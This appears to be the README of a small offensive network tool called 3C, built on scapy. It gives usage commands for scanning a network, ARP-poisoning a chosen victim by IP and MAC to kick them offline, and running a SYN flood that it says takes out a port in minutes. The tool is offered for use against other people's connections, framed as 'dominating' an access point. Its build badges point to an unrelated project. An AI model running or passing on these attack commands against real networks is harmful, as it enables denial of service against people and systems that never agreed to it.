
<img src="https://github.com/PyDever/AirCat/blob/master/img/3c%20(1).png" width="250">

 [![Build status](https://ci.appveyor.com/api/projects/status/pjxh5g91jpbh7t84?svg=true)](https://ci.appveyor.com/project/tygerbytes/resourcefitness) 
[![Coveralls](https://coveralls.io/repos/github/tygerbytes/ResourceFitness/badge.svg?branch=master)](https://coveralls.io/github/tygerbytes/ResourceFitness?branch=master) 
[![License](https://img.shields.io/badge/License-BSD%202--Clause-orange.svg)](https://opensource.org/licenses/BSD-2-Clause)
<br>

3C allows you to dominate your access point with ARP spoofs.
First, tap your access point to get a list of all connected clients:
```
$ python scan -r <IP range>
```
```
$ python poison -t <victim IP> -m <victim MAC>
```
<br>

***New feature!*** (v2.0 update)
3C can now perform SYN flood DDoS attacks.
```
$ python flood -t <victim IP> -p <port> -ttl <time-to-live> -l <payload>
```
It will take out a port in about 3-5 minutes. It is not 
multi-threaded yet.

## Installation 
Make sure to have `scapy` fully installed and tested.
```
$ git clone <this repo>
```

## Explanation
3C injects your access point with venomous ARP packets that kick the victim offline. 
```
                         (no connection)
You -----[3C_pkt]-----> AP -----X-----> victim
```

